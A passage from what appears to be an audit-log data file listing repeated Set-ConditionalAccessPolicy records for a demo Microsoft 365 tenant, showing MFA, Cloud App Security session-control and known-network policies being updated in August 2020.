''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/6/2020 2:16:16 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '8/6/2020 2:16:17 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/6/2020 2:16:17 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/7/2020 3:03:46 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/7/2020 3:03:46 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/7/2020 3:03:45 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/7/2020 3:03:43 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/7/2020 5:32:24 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/7/2020 5:32:24 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '8/8/2020 2:05:37 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '8/8/2020 2:05:37 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/8/2020 5:07:46 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/8/2020 5:07:46 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/6/2020 5:18:57 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '8/6/2020 5:18:56 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/9/2020 1:49:56 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/9/2020 1:49:56 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/9/2020 5:08:00 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/9/2020 5:08:04 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/10/2020 2:30:02 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/10/2020 2:30:04 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/10/2020 5:20:06 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/10/2020 5:20:06 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/10/2020 5:20:06 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '8/10/2020 5:20:08 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/11/2020 2:42:39 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '8/11/2020 2:42:41 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/11/2020 5:02:25 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': 